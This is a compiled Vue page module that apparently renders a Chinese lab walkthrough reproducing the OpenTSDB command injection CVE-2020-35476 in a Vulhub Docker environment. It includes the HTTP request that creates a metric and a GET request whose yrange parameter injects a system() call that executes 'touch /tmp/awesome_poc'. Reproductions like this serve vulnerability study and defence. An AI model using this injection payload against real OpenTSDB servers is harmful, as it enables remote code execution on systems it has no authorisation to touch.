import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as c,c as o,a as e,b as i,d as a,e as l}from"./app-58e4a7d6.js";const r={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),p=e("p",null,"OpenTSDB 是一款基于 Hbase 的、分布式的、可伸缩的时间序列数据库。在其 2.4.0 版本及之前，存在一处命令注入漏洞。",-1),u=e("p",null,"参考链接：",-1),m={href:"https://github.com/OpenTSDB/opentsdb/issues/2051",target:"_blank",rel:"noopener noreferrer"},g={href:"https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html",target:"_blank",rel:"noopener noreferrer"},b=l(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 OpenTSDB 2.4.0：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问<code>http://your-ip:4242</code>即可看到 OpenTSDB 的 Web 接口。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240307165806970.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用这个漏洞需要知道一个 metric 的名字，可以通过<code>http://your-ip:4242/api/suggest?type=metrics&amp;q=&amp;max=10</code>查看 metric 列表：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240307165830409.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里的 metric 列表是空的。但当前 OpenTSDB 开启了自动创建 metric 功能（<code>tsd.core.auto_create_metrics = true</code>），所以我们可以使用如下 API 创建一个名为<code>sys.cpu.nice</code>的 metric 并添加一条记录：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /api/put/ HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 150

{
    &quot;metric&quot;: &quot;sys.cpu.nice&quot;,
    &quot;timestamp&quot;: 1346846400,
    &quot;value&quot;: 20,
    &quot;tags&quot;: {
       &quot;host&quot;: &quot;web01&quot;,
       &quot;dc&quot;: &quot;lga&quot;
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240307165935912.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如果目标 OpenTSDB 存在 metric，且不为空，则无需上述步骤。再次查看 metric 列表，metric 已经创建完成：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240307170059167.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送如下数据包，其中参数<code>m</code>的值必须包含一个有数据的 metric：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /q?start=2000/10/21-00:00:00&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[0:system(%27touch%20/tmp/awesome_poc%27)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json HTTP/1.1
Host: your-ip:4242
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240307170532492.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入容器中可见 <code>touch /tmp/awesome_poc</code> 已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240307170625205.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,18);function v(h,f){const n=s("ExternalLinkIcon");return c(),o("div",null,[d,p,u,e("ul",null,[e("li",null,[e("a",m,[i("OpenTSDB/opentsdb#2051"),a(n)])]),e("li",null,[e("a",g,[i("https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html"),a(n)])])]),b])}const k=t(r,[["render",v],["__file","OpenTSDB 命令注入漏洞 CVE-2020-35476.html.vue"]]);export{k as default};
